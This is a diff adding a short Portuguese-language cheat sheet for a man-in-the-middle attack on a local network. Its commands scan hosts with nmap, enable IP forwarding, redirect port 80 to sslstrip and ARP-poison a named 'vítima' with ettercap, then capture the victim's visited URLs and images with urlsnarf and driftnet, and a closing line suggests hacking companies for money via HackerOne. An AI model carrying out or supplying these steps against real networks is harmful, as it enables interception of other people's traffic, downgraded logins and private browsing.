@@ -1,0 +1,36 @@
+estar conectado na rede
+para saber o ip do roteador
+- route -n
+
+escannear a rede
+nmap -sn #(iproteador)/24
+
+para ver as portas abertas
+nmap -sV #(ipvitima)
+
+habilitar o redicionamento de pacotes
+- echo 1 >> /proc/sys/net/ipv4/ip_forward
+
+redirecionar a porta 80 para 10000
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+colocar o sslstrip lendo tudo que passa na porta 10000
+git clone https://github.com/moxie0/sslstrip
+sslstrip -i wlan0
+
+iniciar interceptacao
+-ettercap -T -q -i wlan0 -M arp:remote /#()iprouter/ /ipvitima/
+
+para escannear toda rede e so nao preencher as barras
+ex: // //
+
+para saber quais sites o dispositivo esta acessando
+#: apt-get install dsniff
+urlsnar -i wlan0
+
+#: apt-get install driftnet
+para ver as imagens que ele acessa
+driftnet -i wlan0
+
+para hackear empresas e ganhar dinheiro
+-hackerone link https:www.hackerone.com/
